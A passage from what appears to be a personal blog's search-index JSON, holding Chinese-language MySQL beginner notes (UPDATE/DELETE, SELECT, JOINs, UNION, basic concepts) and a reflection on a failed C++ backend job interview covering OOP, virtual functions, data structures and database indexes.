UPDATEstudentsSETscore=0WHEREid=10;  语法是这样的。\n1  UPDATE[表名]SET[列名]=[新值]WHERE[条件];  更新多条的话是这样的\n1 2 3 4 5 6  UPDATE[表名]SET[列1]=[新值],[列2]=[新值],...[列N]=[新值]WHERE[条件];   千万小心，如果没有 WHERE子句的话，指定的列会全部被设置成这个值。这样一来，所有的学生都变成了 0 分\u0026hellip;\u0026hellip;你会被手撕了的。\n 删除 DELETE DELETE的作用是删除行，同样的，万分注意WHERE子句一定要正确编写，不然真的要删库跑路了。\n同样以之前那位作弊的同学为例，很遗憾，他又一次作弊被抓住了，传说中的高科技 AR 技术作弊眼镜也没能让他逃过监考员的火眼金睛，于是他被退学了\u0026hellip;\u0026hellip;\n另一个悲伤的故事:P\n1  DELETEFROMstudentsWHEREid=10;  语法是这样子的。\n1  DELETEFROM[表名]WHERE[条件];  如果不写WHERE的话\u0026hellip;\u0026hellip;找个好点的新工作吧，不要再去写SQL了，ORM 多好。\n 注意，不写WHERE子句会删除这个表里的所有行。\n ","date":"2018-06-23T21:51:00+08:00","permalink":"https://nnnewb.github.io/blog/p/mysql-24%E5%B0%8F%E6%97%B6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-3/","title":"MySQL 24小时入门笔记 - 3"},{"content":"查询 SELECT SELECT是一个特殊的关键字，它的语义是查询，取出结果。\n 注意：仅为个人理解。\n FROM FROM子句，标识要查询的对象的来源，来源可能是多个的。在查询有多个来源表的情况下，称之为联结查询（Join query）。\n最常见的常规写法是SELECT column FROM table，表示从特定表取出所有行的特定列。\nWHERE WHERE子句用于过滤查询的行，只有满足条件的行会被查询出来。\n常见的用法有SELECT column FROM table WHERE column \u0026lt;\u0026gt; 0，表示在table表中查询column非空的行，返回这些行的column。\n其中的二元关系运算符\u0026lt;\u0026gt;表示不等于，其他常见的关系运算符还有这些。\n   运算符 含义     = 相等   \u0026gt; 大于   \u0026lt; 小于   \u0026gt;= 大于等于   \u0026lt;= 小于等于   != 不等于   \u0026lt;\u0026gt; 不等于    此外还有一些SQL关键字可以辅助编写判断逻辑。\nSQL关键字IN可以用于判断元素是否在集合中。举例，SELECT 1 IN (1,2,3)，查询1是否在1,2,3这个集合中。被判断的集合需要被小括号包围，并且以逗号分隔元素。\nSQL关键字BETWEEN可以判断元素是否在一定区间中。举例，SELECT 1 BETWEEN 0 and 10，查询1是否在0到10的区间内。语法是BETWEEN [low] AND [high]，区间较小的一端必须在左侧，较大的一端必须在右侧。\nSQL关键字LIKE可以用非常简单的通配符来判断元素是否匹配一定的规则。举例，SELECT 'abcabcabc' LIKE '%CAB%'，判断字符串abcabcabc是否匹配%CAB%。值得注意的是，模式串中的%代表的是匹配 0 或任意多个字符，就像是正则表达式中的*一样。此外还有_，下划线，匹配 1 个任意字符。\nMySQL扩展的REGEXP可以用正则表达式来匹配元素是否符合模式串。举例，SELECT 'abcabcabc' REGEXP '.*cab.*'，正则表达式不做赘述，简单的模式串大家都会写。\nORDER BY ORDER BY就像字面意义上说的那样，按照某个列来进行排序。举例来说，我有一个学生表，记录了学号和姓名，我可以按照学号排序。\n1  SELECT*FROMstudentsORDERBYid;  默认排序是升序，也可以通过指定DESC或者ASC来决定怎么排。ASC是升序，DESC是降序。\n1  SELECT*FROMstudentsORDERBYidDESC;  AS AS常见的用法是建立别名。\n1  SELECTcolumnASid_aliasFROMmy_tableAStable_aliasWHEREtable_alias.column\u0026lt;\u0026gt;1;  这里出现了一个新的语法细节，table_alias.column。用点.连接表名和列名的行为类似于 C++中的\n1 2  typedef table_alias = my_table; auto id_alias = SELECT(table_alias::column, table_alias::column != 0);   看得出来，table_alias.column是完全限定了column是哪个column，之所以有这种语法，是因为FROM子句需要支持多个表作为查询来源。到时候可能就会用到table1.column \u0026lt;\u0026gt; 1 AND table2.column \u0026lt;\u0026gt; 2这样的写法了。\n而查询开头的column AS id_alias则是标识查询结果列叫做id_alias，举例如子查询的情况下，便于引用。\nJOIN JOIN的术语叫做联结，使用了JOIN关键字的查询叫做联结查询。\n联结查询和一般的查询不同的地方是，联结查询的数据来源是多个表。\n最简单的联结查询是内联结查询。\n举例来说，我现在有表students如下，所有学生根据超能力开发等级分配到多个班级。\n   id name class     1 stu1 1   2 stu2 2   3 stu3 3   4 stu4 4    又有表top_class，收录了所有接收高等级超能力者的班级，能进入这些班级的学生都是如同能考上985、211般恐怖如斯的存在。\n   id name     1 Lv 5   2 Lv 4   3 Lv 3    现在我们要查询出学生中那些恐怖如斯的存在有哪些。\n1  SELECTstudents.nameASnameFROMstudentsINNERJOINtop_classONtop_class.id=students.class;  语法JOIN [表] ON [条件]也很简单啦。在例子中，JOIN表示要联结表top_class，ON表示查询的对象要符合条件top_class.id = students.class。不好理解？看看伪代码。\n1 2 3 4 5 6  for(auto student : students) { // 先过滤 students 表本身，这个过滤应该由 WHERE 子句完成  for(auto cls : top_class) { // 然后联结表 top_class  if(student.cls = cls.id) // 判断 ON students.class = top_class.id  results.push(student); // 得出结果  } }    注意，伪代码的查询过程是错误的，为了方便理解 students.class = top_class.id 才这么写。真实数据库实现联结查询的方法应当查阅对应DBMS的文档。\n 注意的关键点有ON很像但不同于WHERE，在了解LEFT JOIN和RIGHT JOIN时会区分。\nLEFT JOIN LEFT JOIN又叫左联结，基本思路是写在LEFT JOIN左边的表满足条件即可作为结果，即使右边的表没有满足条件的条目。\n还是以上文的学园都市数据库为例（我 tm 写了什么\u0026hellip;）\n学生表 students\n   id name class     1 stu1 1   2 stu2 2   3 stu3 3   4 stu4 4    班级表 top_class\n   id name     1 Lv 5   2 Lv 4   3 Lv 3    现在我们查询学生都处在哪些班级，得到班级的名字。\n1 2 3  SELECTstudents.nameasname,top_class.nameasclsFROMstudentsLEFTJOINtop_classONtop_class.id=students.class;  查询结果应该是这样子的。\n   name cls     stu1 Lv 5   stu2 Lv 4   stu3 Lv 3   stu4 NULL    注意到了吗？stu4虽然不是top_class的学生，但是还是被查询出来了。\nRIGHT JOIN 继续拿学园都市做例子\u0026hellip;\u0026hellip;\n其实是和左联结一个鸟样。\n1 2 3  SELECTstudents.nameasname,top_class.nameasclsFROMtop_classRIGHTJOINstudentsONtop_class.id=students.class;  我们注意到\u0026hellip;\u0026hellip;我就是把 students和 top_class换了个位置。查询结果其实是一样的。\n   name cls     stu1 Lv 5   stu2 Lv 4   stu3 Lv 3   stu4 NULL    CROSS JOIN 交叉联结，查询结果是联结的表和FROM的表的笛卡尔积，这么说听的明白不？听不明白就算了，因为交叉联结基本用不到。\n其实就是把两个表的每个行都排列组合一下：\n 表 A 行 1-表 B 行 1 表 A 行 1-表 B 行 2 \u0026hellip;\u0026hellip; 表 A 行 10-表 B 行 1 表 A 行 10-表 B 行 2 表 A 行 10-表 B 行 3 \u0026hellip;\u0026hellip;  JOIN 自己？ 术语叫自联结，其实也挺好理解的，直接举个例子看看。\n   id name class     1 stu1 1   2 stu2 1   3 stu3 2   4 stu4 2     注意我数据改了哈。\n 现在要查询出所有和stu1同一个班级的学生。\n一般我们想怎么查？先查出stu1是哪个班级的：SELECT class FROM students WHERE name = 'stu1'，然后查出所有属于这个班级的学生：SELECT name FROM students WHERE class = [上次查出来的班级]。\n那么\u0026hellip;怎么写成一句话呢？\n这时候自联结就可以上场了。\n1 2 3 4  SELECTs1.id,s1.name,s1.classFROMstudentsASs1INNERJOINstudentsASs2WHEREs1.class=s2.classANDs2.name=\u0026#39;stu1\u0026#39;;  查询结果是\n   id name class     1 stu1 1   2 stu2 1    基本思路是这样的：FROM的表是s1，因此INNER JOIN查询结果来自s1而不是s2。查找s1表中每个行的class在s2表里有没有行具有同样的class属性，同时，s2具有和s1同样class属性的行还必须有个stu1的name。\n分析得知，s2中有stu1这个name的行只有1，所以s2表其实长这样。\n   id name class     1 stu1 1    这时候再去看s1表，s1表的class同时存在于s2表的行只有1和2了。\nOUTER JOIN 其实OUTER JOIN上面的LEFT JOIN和RIGHT JOIN已经讲过了，LEFT JOIN的完整写法就是LEFT OUTER JOIN，RIGHT JOIN就是RIGHT OUTER JOIN，和INNER JOIN的区别在于OUTER JOIN包含了指定表里不满足ON条件的行。\n这有个知识点，就是ON条件不过滤指定OUTER JOIN的表的不满足条件的行，但是WHERE会过滤。\nUNION UNION关键字的术语是联合查询。\n作用是将多个SELECT的结果放在一起并返回。\n举个例子\u0026hellip;\u0026hellip;我们要查询全美最好的大学american_top_college和中国最好的大学chinese_top_college数据，来决定报考哪个大学（反正都考不上），如果不想写成两句SELECT，然后手工合并成一个表格的话，那么就用UNION查询吧。\n1 2 3 4  SELECT\u0026#39;american\u0026#39;ASnation,american_top_college.nameAScollege_name,american_top_college.score_lineASscore_lineFROMamerican_top_collegeUNIONSELECT\u0026#39;china\u0026#39;ASnation,chinese_top_college.nameAScollege_name,chinese_top_college.score_lineASscore_line;  查询结果\u0026hellip;不展示了。\n还有个细节可能要注意，如果有大学同时是美国大学和中国大学的话，那么为了在联合查询中排除相同的项目，可以使用UNION ALL而不是UNION。\nFULLTEXT MySQL支持一种实用的文本索引方式，叫做全文本搜索。大家都知道，正则表达式和简单通配符来查找文本是非常消耗性能的操作，而且难以优化（反正我想不出任何减少查询的优化思路）。MySQL提供了全文本搜索的属性来帮助索引文本（但是想到中文支持我觉得已经凉的差不多了），快速查询出包含特定词汇之类的行。\n 抱歉我觉得不行。不说别的，中文分词就\u0026hellip;\u0026hellip;\n 跳过了跳过了。\n","date":"2018-06-23T15:41:00+08:00","permalink":"https://nnnewb.github.io/blog/p/mysql-24%E5%B0%8F%E6%97%B6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-2/","title":"MySQL 24小时入门笔记 - 2"},{"content":"1. 数据库概念 1.1 数据和储存 数据库本质上做的工作是储存和查询数据。理论上而言，MySQL应该叫做DBMS，也就是数据库管理系统，而不是数据库。\nDBMS提供了统一的建立、使用、管理数据库的接口，常见的DBMS有postgreSQL、MariaDB、SQL Server等。\n1.2 数据库和Schema 通常来说，一个DBMS会支持多个数据库共存。这里所说的数据库指的是特定数据库管理系统管理下的数据库，而不是上一节说的DBMS。\n而Schema的中译术语一般叫模式，Schema描述了数据库的结构，比如说有哪些表，表有哪些字段，字段分别有哪些限制，有哪些声明了的函数，等等。\n通常的DBMS往往是这样的结构：位于DBMS管理最顶层的是一个或多个数据库，数据库里存放表，表里以行为单位存放数据。\n1.3 表、列、键、行 1.3.1 表 表的英语术语是Table。\n用过 Excl 吗？\n   id name     1 Mike   2 John    直观的表就是一个二维的“表”，有行，有列。\n1.3.2 列 列的术语是 Column。\n每个列都应该有一个特定的类型（type），使该列仅仅储存指定类型的数据。\n1.3.3 键\u0026hellip;\u0026hellip;或者叫码 键的术语是 Key。\n通常指的是Primary Key，也就是主键。主键可以是任意一个列。但是如果列是主键，那么这个列必须每个行都保证不和其他行重复。\n主键也可以是多个列，如果是多个列，那么必须保证这些列的组合不重复。\n举例来说\n   db table id name     aa aaaaa 11 xxxx   aa bbbbb 11 xxxx    其中db和table还有id都是主键，只要保证没有两个行同时存在相同的db/table/id就算是满足了主键约束。\n 需要注意的是，多主键的可移植性存疑，不一定其他的DBMS会支持。\n 1.3.4 行 行的术语是 Row。\n每个行都是一条记录（record），换做对象的概念的话，也可以说，每个表都储存了一个其特有的的Row对象的集合，Column一一对应Row对象的属性。\n比如上文的\n   id name     1 Mike   2 John    对象概念表达就是\n1 2 3 4 5 6  class row { int id; std::string name; }; const std::set\u0026lt;row\u0026gt; table;   1.4 SQL 是什么 SQL的直译是结构化查询语言，其实就是标准化的数据库查询语言，基本每个DBMS都支持。\n但是\u0026hellip;\u0026hellip;数据库管理系统对SQL标准的支持并不是那么上心。其中有性能优化、平台优化之类的原因，也有数据库软件开发商自身的考虑。但总而言之，不要太期待同样的SQL能在任意DBMS里都一样跑得欢。\n","date":"2018-06-23T02:24:00+08:00","permalink":"https://nnnewb.github.io/blog/p/mysql-24%E5%B0%8F%E6%97%B6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/","title":"MySQL 24小时入门笔记 - 1"},{"content":"Intro 简单介绍下面试的前置情况。\n面试的公司是鲸鱼游戏，职位是后端开发工程师，开发语言 C++。\n这篇博文主要是为了记录面试中发现的自身不足。\n这次面试里，因为面试约得比较匆忙，所以基本没做任何准备。讲道理的说我是有点盲目自信了，毕竟 C/C++是我的第一语言来着，本来以为考察语言的部分不会有什么问题，但没想到因为紧张而错漏百出。\n那么接下来就直接进入正题，以下是对面试中遇到的问题重新思考后的回答和想法。\n 下面面试官的提问并非原话，有经过脑补润色。\n 起手式：面向对象  面试官：讲讲面向对象，继承，还有多态。我们都知道程序设计有两种常见的范式，面向过程和面向对象，讲讲面向对象给我们带来了什么好处？\n 实话说第一问就已经有点出乎意料，但想想其实还是在意料之中。初级职位更注重于基础概念和技能，中高级职位可能会在数据结构和并发一类的问题上更深入。\n 答：抽象，归类 blabla\u0026hellip;易于维护 blabla\u0026hellip;\n 全错。\n现在回忆起来，面试官想问的其实只有一点，就是那句封装。\n封装是面向对象的核心概念之一。\n封装使代码成为一个黑箱，让我们不必关注它的实现，而是关注它的行为和接口。\n这产生了面向接口编程的概念，我们不再关注封装后的对象内部的逻辑，我们给封装后的对象以输入，然后从封装后的对象里取出数据。\n封装并不只是一系列接口的集合，更包含了数据和状态，它就是一个微型化的服务，调用者告诉它去做什么事，而不关心它怎么做。\n第二招：继承  面试官：讲讲继承。\n  我：代码复用，blabla\u0026hellip;\u0026hellip;\n 代码复用，这是核心。\n代码复用是继承最主要的作用，大家都知道。面试官并没有在这方面继续深入，所以能答出代码复用其实已经差不多了。\n除非再抠上语言相关的语法细节：多继承和单继承。\n多继承 C++ 采用了多继承模型，即一个子类可以有多个父类。\n1 2 3  Father ------| |====\u0026gt; child Mother ------|   多继承可以允许一些特殊的编程范式。比如说mixin模式。但是多继承也存在其固有的复杂性，主要表现在运行时多态上。\n举几个多继承上常见的问题。\n 父类成员冲突  典型场景如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  class ParentA { public: void func(){} }; class ParentB { public: void func(){} }; class Child: public ParentA,ParentB {}; int main() { Child c; c.func(); // error \treturn 0; }   解决办法也很简单\n1 2 3 4 5  int main() { Child c; c.ParentA::func(); return 0; }   之所以如果不调用 func 就不会出错，是因为 func 在编译后的 ABI 导出的名字并没有产生冲突。但如果主动调用了func，编译器则需要插入一个函数调用，但这里的func语义却是不明确的，所以编译阶段就会报告错误。\ndynamic_cast会改变指针  dynamic_cast是基于 RTTI 的运行时类型安全的标准类型转换，dynamic_cast本身是一个关键字，这里就说一说dynamic_cast的行为和多继承。\n多继承下的dynamic_cast会修改指针绝非危言耸听。事实上只要稍作思考就能得出这样的结论：多继承下的内存布局应该是什么样子的？\n1 2 3 4 5  v Pointer to Child v Pointer to ParentB v Pointer to ParentA | ParentA | ParentB | Child | [-----------====================\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;]   C++ 鼓吹Zero cost abstraction也不是一天两天的事情了，成果如何不予置评，但显然，专门为多继承下的指针附加类型信息，以允许ParentB*类型的指针指向的地址和Child*相同是不可能的。\n遑论 C++标准里根本没地址这回事儿了，指针指向的是啥玩意儿都有可能。\n单继承 单继承就简单得多，只允许一个父类存在，根据语言设计也可能允许实现多个接口。比如说Java和C#。以我比较熟悉的 Rust 为例（暂不提继承，因为Rust就没继承这码事儿，全是Trait），一个struct可以实现多个Trait，然后以Trait object来实现对象多态。\n单继承更多是在多态、重载、接口等方面的取舍，就不细谈了。\n第三招：多态 多态和面向接口编程  面试官：知道多态吗？多态有什么好处？\n  答：多态就是\u0026hellip;blabla\u0026hellip;不去关注子类细节，归类成 xxx\u0026hellip;\u0026hellip;blabla\n 多态算是面向对象基本概念之一了。\n多态最基本的解释就是同一个接口的不同实现，但我理解中的多态解释则更趋向于类型擦除，即我不在乎你是什么黑人、白人、黄种人、香蕉人，我只要你能做到某件事。本质上来说，多态的主要作用就是擦除细节。\n举个例子，我打算去面试一家公司，面试官想要的是什么呢？他想要的是能干活的人。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  class Worker { public: const int declarePay; const int declareEfficiency; BOOL testWorkEfficiency(SomeShit); virtual ~Worker()=0; }; class Company { public: BOOL hire(Worker) { ... } }   面试者可能是HardWorker，FxxkWorker都是Worker实例，但他们也同时是Human，可能是Wife，可能是Husband，也可能是Father、Mother，但是这些我们都不关心。\n我们不可能为每个People某某某各自定义一个BOOL hirePeople某某某() {}，我们关注的是工作能力，所以我们要在类型里擦除掉这些无关的细节，保留关注的部分。\n多态做的就是这样的一件事：我不在乎你是谁，我在乎你是不是能干好这件事的人。\n这么说其实有些脱离主题了，因为这是面向接口编程的思想，而不是对多态的学术解释，但这确实就是我对多态的理解，它的主要作用就是隐藏差异，进而发展为擦除细节。\n我的回答其实根本没到点上，也没 Get 到面试官的 point，所以面试官很快就换了下一个问题。\n谈谈虚函数  面试官：虚函数的作用是什么？\n  答：啊？实现多态啊？\u0026hellip;\n 可以说是最差的回答。\n面试中没有反应过来问的啥，知道被拒绝了才突然明白。\no(￣ヘ￣ o＃)\n这已经问到语言细节了，所以咱们就从语言出发来讲。\n多态 首先虚函数是什么？虚函数是 C++实现多态的手段，这么答没错，学过 C++都知道。不过虚函数不仅仅是这一点。\n咱先从这一点讲起。\n虚函数通过一个叫虚函数表的东西来实现多态，这个虚函数表是实现定义的，标准没有对vtable做什么规定，比如说必须放在类指针的前后几个字节处啊什么的\u0026hellip;\u0026hellip;不存在的。所以也不谈虚表是怎么实现的，这已经是具体到平台和编译器上的差别了，要抠这个的话必须去读编译器和平台相关的各种文档了，PE 格式啊 DLL 啊 SharedObject 啊什么的。\n如果问起来的话\u0026hellip;\u0026hellip;嗯\u0026hellip;\u0026hellip;这个职位应该很厉害。\n所以我就跳过了。\n直接给个虚函数的实例，真的没什么好说的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  #include \u0026lt;iostream\u0026gt; class ParentA { public: virtual vFunc() { std::cout \u0026lt;\u0026lt; \u0026#34;ParentA\u0026#34; \u0026lt;\u0026lt; std::endl; } }; class Child: public ParentA { public: virtual vFunc() override { std::cout \u0026lt;\u0026lt; \u0026#34;Child\u0026#34; \u0026lt;\u0026lt; std::endl; // 顺便写调用父类的  ParentA::vFunc(); } };   虚析构函数 C++虚函数的另一个重要用途就是虚析构函数。\n因为\u0026hellip;\u0026hellip;C++对象模型中，析构函数的位置十分尴尬。\n构造函数也就算了，无论如何也要显式调用一次。\n析构函数则因为多态的存在而十分尴尬：给你一个父类指针列表，你显然不能一个一个检查这些指针指向是什么对象，然后再转回去，最后才 delete 它。\n光是听起来就麻烦得要死，更别提有时候根本做不到。C++脆弱的RTTI和基本不存在的Reflection可是出了名的。\nC++对这个问题的解决办法就是虚析构函数。\n和一般的虚函数不同，一般的虚函数一旦被override，除非你主动调用指定父类的虚方法，否则调用的必然是继承链最后一个override了这个虚方法的类的虚方法实现。\n析构函数的话就稳了，它会链式的调用继承链上每个类的析构方法，多继承的情况下则是按照继承的顺序调用析构方法。\n不用主动写ParentA::~ParentA()，是不是特别爽？\n 还行，这就是个语法糖。\n 纯虚函数和抽象类 最后是纯虚函数。\n其实这玩意儿我更愿意称他为接口。\n本质上来说，纯虚函数规定了一个方法，这个方法接收固定的输入，并保证提供一个输出，相应的可能还有异常声明，来说明这个方法可能抛出的异常。\n怎么样，看起来眼熟不？\n还没完，纯虚方法没有实现（你开心的话也可以写个实现），强制要求子类必须实现，而定义了纯虚方法的类被称之为抽象类。\n我想就算是叫它接口类它也不会反对的吧。\n纯虚函数可以类比于C#的interface，或者typescript的interface，总之就是各种语言的interface。这些interface在具体的规定上可能有所差异，比如说不允许写数据成员啦，数据成员写了不算在实现interface的类上还要再声明一次啦，interface的方法可不可以有个默认实现啦，这些都是细节。\n还记得上面我说多态吗？多态的目的是擦除类型细节，所以这些长得各不相同百花齐放的interface做的事情其实都是一回事：你能做啥，那么你是啥。\n这里再说个细节，纯虚函数作为析构函数的时候，析构函数应该有个实现\u0026hellip;\u0026hellip;\n听起来挺奇怪的？不写纯虚析构函数实现的话，会报个链接错误\u0026hellip;至于为什么要这么做，其中的取舍就不得而知了。\nC++的纯虚函数和抽象类很灵活，没有其他语言interface种种限制，如果要追问纯虚函数\n when? where? why?\n 那就要看到具体场景了，C++这些灵活的特性一不小心就会变成滥用，反正这么问我应该也就答interface、mixin以及其他具体需求的场景这样子了。\nMixin 模式 Mixin模式在Python里比较常见，不过 C++也并不是没有。通过定义纯虚析构函数，来给一个对象混入特定功能而又不允许自己被独立构建，算是个常见的范式。\n举个例子，引用计数，如果发现自己引用归零了就释放资源，线程安全之类的问题先不管，仅仅是展示这个范式。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  #include \u0026lt;iostream\u0026gt; class RcMixin { private: using deleter = ()-\u0026gt;void; int *_rc = nullptr; deleter resDeleter; public: RcMixin(deleter resDeleter):resDeleter(resDeleter) { *_rc+=1; // 线程安全就先放一边 \t} RcMixin(const RcMixin\u0026amp; other) { resDeleter = other.resDeleter; *_rc+=1; } virtual ~RcMixin() = 0 { *_rc-=1; if(*_rc \u0026lt;= 0) { resDeleter(); } } }; // 虽然是个RcMixin但是外界并不需要知道它是RcMixin class SomeShit: private RcMixin { private: int* res = nullptr; public: SomeShit() : RcMixin([\u0026amp;this]() { std::cout \u0026lt;\u0026lt; \u0026#34;\u0026#34; \u0026lt;\u0026lt; std::endl; delete this.res; }) { res=new int(10); } virtual ~SomeShit() {} }; int main() { SomeShit a; auto b = a; auto c = b; }   代码没测过，反正大概就是这种感觉，将某些功能混入一个现存的类，而不需要做太多的工作。在 C++里没那么方便，强类型下的 Mixin 需要很多变通技巧才能愉快地混入新功能，而鸭子类型Duck typing的语言则舒爽很多，当然，最好的还是具有完善 Reflection 和 Attribute 支持的语言，完全避免了对Mixin类型的构造和需要利用的数据的绑定一类的不必要的关注。\n扩展：虚继承 同样是 virtual 关键字，虚继承和虚函数关系就不怎么大了。\n虚继承面对的问题是多继承时，多个父类继承自同一个基类这一问题。\n听起来是不是有点奇怪？这些父类继承自同一个基类会有什么问题？\n事实上，这个问题取决于写出多继承代码的人，也取决于这多个父类是否有对多继承方面做过考虑。\n举个简单的例子，ParentA和ParentB都继承自DataA，ParentA修改了DataA的数据，但ParentB不知道。如果ParentB需要根据DataA的某些数据进行操作——很遗憾，这个行为可能与预期的不同。\n之所以引入虚继承，是为了解决要不要共享同一个基类实例的问题，选择虚继承，则选择共享基类实例。\n共享基类实例的优势是，多个父类的功能可以无缝结合。ParentA和ParentB可以共享基类定义的Mutex等状态资源——当然，前提是设计父类的人有过这方面的考虑。\n不然的话，不共享基类实例是个保守但更安全，不易出现歧义的选择。\n第四招：数组和链表  面试官：我们聊一下数据结构方面吧\u0026hellip;..讲一下数组和链表？可以从访问和删除两方面来说。\n  答：数组允许随机访问，只需要一步就能找到对应元素，而链表需要\u0026hellip;\u0026hellip;blabla，数组删除元素如果需要移动后续元素的话，会产生复制操作性能损失，链表只需要修改几个指针\u0026hellip;blabla。\n 实际上答到这里我已经不知道自己在说啥了。\n数组和链表的区别还是挺大的，我应该算是 Get 到了几个点？下面是重新整理了语言后的回答。\n数组和链表的内存布局 数组和链表两者都是线性数据结构，表现上都是一条有头有尾的有序序列，但是储存方式上有区别。\n数组的储存方式是一端连续的内存空间，索引只需要进行一次指针运算即可获得目标元素的位置，也可以理解为访问时间始终是O(1)。\n PS: 还能写出 0[array] 这样的骚写法，不怕被打死的话。\n 链表的内存布局则是分散的，通常的链表实现往往是插入元素时动态分配一个元素的空间，而删除的时候再释放，长此以往对内存是不友好的，容易产生内存碎片，导致分配较大空间时无法寻得足够长的连续内存片段而造成分配失败。\n\u0026hellip;\u0026hellip;当然，是长期才会产生的问题，而且是切实存在的问题。\n索引 对于数组来说的话，可以理解成标准库的 std::array，也可以理解成原始数组，但不变的是索引方式始终是O(1)复杂度，而且支持随机访问迭代器。\n对于链表来说，不考虑优化后的变体，索引方式在本质上都是顺序访问迭代器——指针也算是概念上的迭代器。所以对于链表，访问时间的复杂度最坏情况应该是O(n)，n是链表长度。不用说，索引性能自然是不如数组的。\n删除 数组删除元素其实是比较烦的，复杂度应该是O(n)，n是数组长度减去删除元素在数组中的位置。最麻烦的是万一数组很长，那么复制元素到上一个位置将会是噩梦。\n当然也不是不能优化\u0026hellip;\u0026hellip;把移动的操作推迟到插入新元素的时候就好了，用一个占位符表示这里已经被删除，同时记录前面有多少个元素被删除。这样一来索引性能会下降（因为要找到上一个被删除的元素，然后更新索引位置，直到找到正确的元素），删除性能提高（只要找到上一个被删除的元素然后记录自己作为被删除元素的位置就好），整体实现的复杂度提升，索引删除插入都要另外编写实现，感觉得不偿失。\n链表删除元素很简单，索引到需要删除的元素的时间复杂度是O(n)，删除操作的时间复杂度是O(1)，而且实现简单。\n扩展：结合两者？ 好吧，这个问题面试官没问到。\n链表和数组结合一下能解决一部分内存碎片的问题，基本思路的话\u0026hellip;\u0026hellip;咱预先分配 100 个元素，如果插入的元素超过了 100 个，咱再分配 100 个元素的空间，然后索引的时候再去找第二个池？\n这个思路术语叫什么记不起来了。\n哦不！他到底想问什么？ 猜一猜面试官到底想问些什么？\n 动态内存分配：数组定长，而链表变长。我感觉这个特征基本没什么好说的，工作中基本没有机会自己重新实现一个线性容器，除非要定制一些特殊的结构，环形链表之类的东西。其他像是链表，数组，队列，标准库都有相应的实现。也许是考虑自行编写线程安全版本的 STL？ std::array和std::list。所以问的是啥呢\u0026hellip;？提供的保证和implement specified还有undefined behavior吗？STL 现在还没有concept，但是早早就有了SFINAE和enable_if之类的东西，constexpr if 更是极大地强化了编译期元编程方面的能力。如果是问标准模板库方面的东西的话，我觉得问标准库线程安全啊，迭代器算法之类的东西要合适得多。所以\u0026hellip;\u0026hellip;大概也不是想问这个。 迭代器。如果是这个的话我真的希望面试官大人能直接说出迭代器三个字\u0026hellip;\u0026hellip;不过好歹回答出随机访问了，应该不至于吧。  第四招：数据库索引  面试官：讲一下数据库的索引有什么作用。\n  我：懵逼\u0026hellip;\u0026hellip;\n 还行，直接懵了。\n因为完全没搞明白面试官的意图：索引指的是啥？面试官是想问数据库索引的方式吗？B+树该怎么实现？\n回来路上我考虑了一下，这几方面可能可以作为回答的方向。\n索引的实现 数据库索引的常见实现方式是 B+ 树，我数据结构学的不好，只知道 B+ 树是个很厉害的数据结构\u0026hellip;..所以博文写到这里，不得不开始查资料了。\n B+ 树是一种树数据结构，通常用于数据库和操作系统的文件系统中。B+ 树的特点是能够保持数据稳定有序，其插入与修改拥有较稳定的对数时间复杂度。B+ 树元素自底向上插入，这与二叉树恰好相反。\n 如果问起 B+树实现，或者让手写个 B+树的话，我也只能望而兴叹了。\npostgres 数据库的索引属性 对于数据库的实现我了解不多。\n大概就是建立个独立的 B+ 树索引\u0026hellip;\u0026hellip;吧？\nemmmmmm 真想不出了\u0026hellip;\n第五招：Primary key  面试官：说下主键的作用。\n  我：emmmmmm\u0026hellip;..\n 到这里我基本已经萌的不行了。（无错字）\n 内心 OS：我是谁？我在哪？我要干什么？\n 甚至连zhujian都听成了zujian\n被面试官提醒了一下\n 面试官 B：就是那个 key\n 我也没反应过来\u0026hellip;\u0026hellip;\n有啥用啊（天真脸） 主键的话，具有唯一性的索引？\nemmmmm，不然还有什么作用呢\u0026hellip;\u0026hellip;\n看来数据库必须下功夫学一学才行啊\u0026hellip;\u0026hellip;\n叮叮叮——You fxxk up  面试官：十动然拒。\n  我：理解理解，谢谢谢谢。\n 还行，回顾完整个面试流程，除了 C++部分可能是因为发挥失常之外，数据库方面的确是没有下够功夫，以至于连索引和 PrimaryKey 这两问都在持续懵逼。\n而且实话说面试，确实有技巧这回事\u0026hellip;\u0026hellip;\n面试官提的问题也存在着范式——网络上面试真题什么的，看起来像是玩笑，但面试官提出这些问题的时候却是认真的。\n尽管\u0026hellip;\u0026hellip;这种\n 聊聊 xxxx（某技术/概念/工具），xxx 的作用是什么\n 的提问确实让人不容易抓住重点\u0026hellip;\u0026hellip;\n考察基础的角度来说，现场白板写一个程序，然后再深入聊聊这么写的用意，有没有优化方案，考察对语言的理解和 api 设计、代码架构能力，比单纯的说说 xxx，问 xxx 作用要实际的多。当然并不是说这么问不好，这些概念的掌握也是非常重要的基础，而且能有效考察面试者语言组织能力和对这方面知识的掌握程度。\n唯一不好的就是，面试者和面试官聊的过程就像是用黑话交流一样\u0026hellip;\u0026hellip;\n不说了，学这黑话去\u0026hellip;\u0026hellip;\n","date":"2018-06-20T19:15:00+08:00","permalink":"https://nnnewb.github.io/blog/p/%E9%B2%B8%E9%B1%BC%E6%B8%B8%E6%88%8F%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0/","title":"鲸鱼游戏面试笔记"}]